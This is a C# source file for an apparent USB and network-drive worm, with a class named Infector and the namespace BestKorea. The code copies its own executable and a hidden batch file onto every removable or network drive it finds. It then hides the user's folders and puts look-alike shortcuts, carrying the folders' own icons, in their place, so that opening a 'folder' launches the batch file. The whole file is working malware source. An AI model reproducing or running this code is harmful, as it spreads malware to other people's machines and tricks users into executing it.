using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace BestKorea
{
    [StructLayout(LayoutKind.Sequential)]
    public struct SHFILEINFO
    {
        public IntPtr hIcon;
        public int iIcon;
        public uint dwAttributes;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szDisplayName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
        public string szTypeName;
    };

    class Win32
    {
        [DllImport("shell32.dll")]
        public static extern IntPtr SHGetFileInfo(string pszPath, uint
    dwFileAttributes, ref SHFILEINFO psfi, uint cbSizeFileInfo, uint uFlags);
    }

    class Infector
    {
        [STAThread]
        public static void InfectDrives()
        {
            var driveList = DriveInfo.GetDrives();

            foreach (DriveInfo drive in driveList)
            {
                if ((drive.DriveType == DriveType.Removable) || (drive.DriveType == DriveType.Network))
                {

                    if (!File.Exists(drive + "execute.bat"))
                    {
                        File.WriteAllText(drive + "execute.bat", Properties.Resources.execute);
                        File.SetAttributes(drive + "execute.bat", File.GetAttributes(drive + "execute.bat") | FileAttributes.Hidden);

                        var exe = System.Reflection.Assembly.GetExecutingAssembly().Location;
                        File.WriteAllBytes(Path.Combine(drive.ToString(), Path.GetFileName(exe)), File.ReadAllBytes(exe));
                        File.SetAttributes(drive + "RoidRage.exe", File.GetAttributes(drive + "RoidRage.exe") | FileAttributes.Hidden);

                        var directories = CustomSearcher.GetDirectories(drive.ToString(), "*", SearchOption.AllDirectories);
                        foreach (var x in directories)
                        {
                            FileAttributes attributes = System.IO.File.GetAttributes(x);
                            if (!((attributes & FileAttributes.System) == FileAttributes.System))
                            {
                                CreateShortcut(x);
                                System.IO.File.SetAttributes(x, File.GetAttributes(x) | FileAttributes.Hidden);
                                Console.WriteLine(x);
                            }
                        }
                    }
                }
            }

            Console.ReadLine();
        }

        static void CreateShortcut(string FullFolderPath)
        {
            string FolderName = Path.GetFileNameWithoutExtension(FullFolderPath);
            string FolderDir = Path.GetDirectoryName(FullFolderPath);
            string FolderRoot = Path.GetPathRoot(FullFolderPath);

            string lnkPath = Path.Combine(FolderDir, FolderName) + ".lnk";
            File.WriteAllBytes(lnkPath, new byte[] { });

            Shell32.Shell shl = new Shell32.ShellClass();
            Shell32.Folder dir = shl.NameSpace(FolderDir);
            Shell32.FolderItem itm = dir.Items().Item(FolderName + ".lnk");
            Shell32.ShellLinkObject lnk = (Shell32.ShellLinkObject)itm.GetLink;

            lnk.Path = FolderRoot + "\\execute.bat";
            lnk.Description = FolderName;
            lnk.Arguments = "\"" + FullFolderPath + "\"";
            lnk.WorkingDirectory = FolderDir;

            SHFILEINFO shinfo = new SHFILEINFO();
            Win32.SHGetFileInfo(FullFolderPath, 0, ref shinfo, (uint)Marshal.SizeOf(shinfo), (int)0x1000);
            lnk.SetIconLocation(shinfo.szDisplayName, shinfo.iIcon);
            lnk.Save(lnkPath);
        }
    }

    public class CustomSearcher
    {
        public static List<string> GetDirectories(string path, string searchPattern = "*",
            SearchOption searchOption = SearchOption.TopDirectoryOnly)
        {
            if (searchOption == SearchOption.TopDirectoryOnly)
                return Directory.GetDirectories(path, searchPattern).ToList();

            var directories = new List<string>(GetDirectories(path, searchPattern));

            for (var i = 0; i < directories.Count; i++)
                directories.AddRange(GetDirectories(directories[i], searchPattern));

            return directories;
        }
    }
}
